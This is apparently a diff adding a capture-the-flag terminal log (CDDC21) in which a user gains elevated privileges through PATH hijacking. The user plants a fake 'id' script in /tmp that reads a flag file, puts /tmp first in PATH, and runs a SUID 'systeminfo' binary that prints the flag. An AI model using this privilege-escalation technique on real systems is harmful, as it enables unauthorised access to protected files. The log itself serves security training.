@@ -1,0 +1,26 @@
+bot6@cybot01:/tmp$ nano /tmp/id
+Unable to create directory /home/bot6/.local/share/nano/: No such file or directory
+It is required for saving/loading search history or cursor positions.
+
+bot6@cybot01:/tmp$ cat /tmp/id
+#!/bin/bash
+cat /home/bot6/flag.txt
+bot6@cybot01:/tmp$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+bot6@cybot01:/tmp$ PATH='/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin'
+bot6@cybot01:/tmp$ id
+cat: /home/bot6/flag.txt: Permission denied
+bot6@cybot01:/tmp$ cd ~
+bot6@cybot01:~$ exportPATH='/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin'
+bot6@cybot01:~$ export PATH='/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin'
+bot6@cybot01:~$ ./systeminfo
+System information...
+
+[*] Date:
+Thu Jun 24 15:12:13 UTC 2021
+
+[*] Kernel:
+5.8.0-1035-aws
+
+[*] User infomation:
+CDDC21{SU!d_!s_Qu!Te_DngeRouS}
